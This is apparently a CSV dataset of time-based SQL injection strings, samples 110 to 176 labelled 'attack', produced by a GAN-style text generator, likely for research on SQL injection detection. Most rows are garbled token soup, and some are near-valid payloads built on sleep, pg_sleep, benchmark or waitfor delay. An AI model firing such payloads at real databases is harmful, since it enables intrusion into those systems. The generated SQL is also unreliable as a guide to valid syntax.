label,payload,family,payload_type,method,run_id,sample_index
attack,"1"" where sleep  =  6383 or from   (  select 6793  =  6383 or elt  (  =  select from from pg_sleep  (  5   )    and    (    (     (  0x76555642   (  select 4240m  =  6272  =  (  5   )     )r  sdd benchmark  'wyvx' --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,110
attack,"1"" where '0:0:5' from       (  select * from   (  select  (  select sleep  (    (  5 )     )  vwyq  )   where delay pg_sleep  (  ""wucy"" 8594 from do  )   and    (    (     (  select 6793 from 2239  =  8252  6272='6866dkvvhtyut  )  gcrrurumq  )   -- like 6175 or from   (  =  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,111
attack,1,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,112
attack,",' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  =  ')rrlq  )   and   5874  =    (  select from   (  5000000,md5  (  5   and    (  ""%""  =  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,113
attack,select benchmark  (  5   and     )     )     )  sed from from from   6272  =  (  sleep  select and   (  select  (  (  5   )     )  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,114
attack,select benchmark  (  0x544d5a4c   (  )  )   s 8507  =  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,115
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ''   )    )     )   and sleep  (  5  )   and    (    (     (  'rs'  =  'hwjy'  =  'otuu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,116
attack,select pg_sleep  (  select pg_sleep  (  5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,117
attack,"1"" where 6969 from pg_sleep  1210  7196 (  5   )    )    u)   and 4240kk  =    (  select 4240 from from pg_sleep  (  5   )     )   (     (  6272    (  3114  (  5   )    )     )  sddhmq  select 3824  =  1568 or 8514  6272  =  6383 7305  =  2044 or from   (  sleep  select from pg_sleep  (  0x544d5a4c   (  0x544d5a4c   )    )    r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,118
attack,"select benchmark  (  5000000, '0:0:5')    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,119
attack,"1"" 6175 rlikesleep  (  select * from   (  (  selectmd5  5   )   and ""uq  e like  =  'rn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,120
attack, 'yfvu' and 4240  =    (     (  0x544d5a4c   <> kst  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,121
attack,"select   (  2239 (  (  (  0x4c4d6142   )    (  select 9008  5000000,md5  (  5   (  vo  )   (  select * fromsleep   (  select 4240  =  # (  (  5000000,md5  (v""  (  5000000,md5  5   )     )   and 8514  =  benchmark  # 6793  =  (  =  benchmark  (  8252  (  8667 and from pg_sleep  (  5000000,md5  (  =  benchmark  (  5   )    )    )    as ke  =  (  =  w and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,122
attack,"1 or 6793  =  5000000,md5  (  5   )    )    ru)  # ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,123
attack,select * from 6969 and(  '%'  =  4683 like #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,124
attack,"1"" pg_sleep     )   and 6969  =    (     (  select 6793 from pg_sleep  (  5  (  select 4240 from pg_sleep  (  5000000,m_  =    (  ""%""  0x544d5a4c   )    )     )   and    (  select 8594 from from   (  select sleep  (  5   and        (    (    (  select and * from from   (  0x544d5a4c   (     (  select  sleep  (  5   )     )   and    (    (  select 6969 from 8514  =  (  5   )    (  select 4240 from from pg_sleep  (  5  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,125
attack,"1   )    )   and 2388  =  (  1210,sleep  (  5   (  select 6969 from from 4240  =    (  select or 8466  1210,sleep  (  5  ) rlt  (  select (  (  1915  1210,sleep  (  5   )     )  sddo  )rmq  )  # e 3672  select 6793 from from pg_sleep  (  5   )     )  -- dkyfzp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,126
attack,)5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,127
attack,1   )    and    (c,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,128
attack, (  select 4240 from pg_sleep  (  5   )    )   5874  =    (    (v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,129
attack,"1""    )    rlhu and    (    (  '%'  =    (  select 6969 from pg_sleep  (  0x544d5a4c    and 8514  =  1568 or 4240  =    (  select from pg_sleep  (  5   '  select 4240 from pg_sleep  =  0x4c4d6142)  sddo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,130
attack,  )    )   and    (q --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,131
attack,:'yfvu' where 7279 from pg_sleep  (  5   )  vwyqu viky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,132
attack,"1"" where sleep  (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,133
attack,select sleep  (  5  )   -- 'yfvu' v09008  0x4c4d6142   (  select 3824  2239  8594 from from from   (  =  (  sleep  (  5  )  Z  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,134
attack, ' and 6969 '0:0:5')   and 8466  =  1210  1210  (  benchmark  (  1132  (  5   )    and    (  select 6793 #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,135
attack," 5   -- y where 8507  ""wucy"" 6969 rmd '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,136
attack, select pg_sleep  (  7279 and from   (  selectsleep  (  (    (  select   (  5   )    (  select 6793 from pg_sleep  (  '%'  select from pg_sleep  (  5   )    )     )  sddo  )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,137
attack,"select (   sleep  (  5   )    and    (    (     (  select pg_sleep  (  5000000,md5  (  0x544d5a4c  )   and    (   (     (  select from pg_sleep  (  5  )     )   # t elt  (  benchmark  (  0x544d5a4c   )    )     )   and           f     (     (  select * from   (  sleep  =  (  5   )    and    (  select  =    n",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,138
attack,1 where      =   1679 from pg_sleep  (  5   )     )    rldmqcr andz  3114    (  select 6793 from pg_sleep  (  5   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,139
attack," where 2044 pg_sleep  (  5000000,md5  (  0x76555642   )     )rmq  ) like """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,140
attack,"select "" pg_sleep  (  5   )     )  gpmq  )  ruaruv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,141
attack,"1 where delay from   (  1915  =    (     (  select 6793 from from pg_sleep  5000000(  (  0x544d5a4c   )    )     )   8466  =    (  0x544d5a4c   )     )     )   (    sdd do  )   and   (  select 6969 38245000000,sleep  (  5000000,md  6272  benchmark  (  (  select  (  5   )     )   )(  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,142
attack, 'rnzp'  =  benchmark  )  (  '   )    )     )   and sleep  (  5  )   and    (    (     (  '  (  1132  (   waitfor '0:0:5' '0:0:5'-- nzz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,143
attack,c  )gq yhst dpd5  )  srmdo  =  1915 8667 fwyvy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,144
attack,"select 4240 from,,md5  (  5   )    )    rlike and   'rnzp'  =  6866q  )  )   -- ue and e elt  (  0x544d5a4c   )  vzh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,145
attack,"select pg_sleep  (  5  )   )    as xe   7305 vwyqt  (  select * from from   (  5  sdd5 benchmark  5   )    )     )  # ""q r #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,146
attack,"select ""wucy"" 6793   =  62725874    (  =  or from       (    (  ""%""  =  'rruy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,147
attack,1'   )     )   -- dkwaitfor from from pg_sleep  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,148
attack,select pg_sleep  (  (  6272  4683 pg_sleep  (  (  (  5   )     )  sw  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,149
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%where or elt  (  5000000,md5  (  5000000,md5  (  5   )    )     )  select 2388  (  5   )    and    (   select 4240  =     srrm_u  )    )     )   6866  =  'rgpuvuvuvt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,150
attack,"1"" where 8507  =  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,151
attack,"select pg_sleep  (  5   and    (     (  5000000,md5  (  0x4c4d6142   )    )   and    (     select    (  select 6969 '0:0:5'   =  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,152
attack,select sleep  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,153
attack," sleep  select g 8594 from pg_sleep  (  5000000,mdmd  =  (  5   )     )     )  sddo  )gc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,154
attack,select sleep  (  select 6969 from pg_sleep  (  5   )     )  sdt  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,155
attack,1   and 4240  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,156
attack, 8594 benchmark  =  7279 n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,157
attack,waitfor sleep  sleep  (  5  )  and 'sa' d  (  =  6272  2841 or sleep  (  =  7021 rlikfrom   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,158
attack,cf)     )    <> e from   (  select 4240 from,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,159
attack,1'   )    )     )   waitfor delay '0:0:5'ru an'  =  'ra'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,160
attack,"1'   )    as dq and 8466    (  benchmark  1210,sleep  6793 ,sleep  (  5    )    rlike  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,161
attack," where sleep  (  8507  )  sddo  )   and 8594  =    (  select pg_sleep  (  select sleep  (  sleep  (  sleep  (  0x544d5a4c   )   or from   (  select   (  select  )   (  ""wucy"" 8594 from # --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,162
attack,select    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,163
attack, select or 8514  =  (  =  4683 from pg_sleep  (  2841 or 4240  6175 8594  =    (  select 4240 sleep  (  5  )   ste from pg_sleep  (  sleep  (  5   )    )     )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,164
attack,"1%"" or 4240  =    (    (  select 6969 4240 ""zc  ""wucy"" el  =  7279 #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,165
attack,""" where from from from   (  5   )    (  select delay 6969 from   'rnzp'  =    (  select 8594 from sleep  (  select  (  (  3672 or 6793  =  (  =  2239sleep and * 4240  =    (  select 4240 from 6793 from pg_sleep  (  select from and sleep  (  select  (  (  select  (  5000000,md5  (  5  )   and    (    (  select * from from   (  select  (  5  8667  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,166
attack,"1"" 4240 and 6969  =    (  select 6793 ""   (  =,sleep  (  5   delay from from from   (  select  (  5   )    )     )   and e 6793  =    (  6272  vike   (  select 4240 from pg_sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,167
attack,"1   )    )   and 6793mq  )   (  0x544d5a4c   )    seegnh'  =  'vwjyd5uswkj  =  'wyvx'  #  =    (     (    (  select * from   (  benchmark  )  (    (  (    (  6272    (  select 4240 from from pg_sleep  (  5   )    )    as be 4240  8507 and 3824  =  1210,sleep  (  (  select and sleep  (  5   )    and    (    (    (  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,168
attack,"1 where 3824  =  6272,sleep  (  select 4240 from pg_sleep  (  (  ""uvzc"" 4240 from and 6793  =    (  ""zlal""  6272,sleep  (  sleep  (  sleep  (  (  5   )    (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,169
attack,"1%"" or    5    )   (  select * pg_sleep  (  5   )    )     )       (  select 6793 from from 8667   (  select  )   (  select sleep  )   (  select 6969 from  s e   (  select 4240  =  =  # pg_sleep  (    sleep  (  5   u     (  select * from   (  select  (  5   )    )     sddoomq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,170
attack,"1%"" where 8667  =  benchmark  (  2841 like from   (  5 r)   benchmark  s k  =  =  1210,sleep  (  5  )   -- yfsrmq  )    s 'sa' from   (  select where delay from 8466  =  2841 or   (  select  (  5000000,md  =  (  sleep  (  5   )    )     )   and   =  ""%""  =    (     (    (  0x76555642   (  '%'  =    and    (     select (r  )     )   and    (     (  sleepmq  )  )  sd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,171
attack,select benchmark  (  5  62726272,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,172
attack,select or select 7021 from 4240 from pg_sleep  (  select 4240 from  r  (  =  benchmark or 4240  3114  =  (  5   (  select 8594 from pg_sleep  (  (  5   )    )     )u)    e from   (  select 6793  =  benchmark  (  5   )     )     ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,173
attack,"1"" blt  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,174
attack,select benchmark  (  5   )    )     r q #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,175
attack,"1'+  (  select 'k""   )    where 'sa' '0:0:5' from              (  select 6793  =     (  (  5   )    (  sleep  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,176
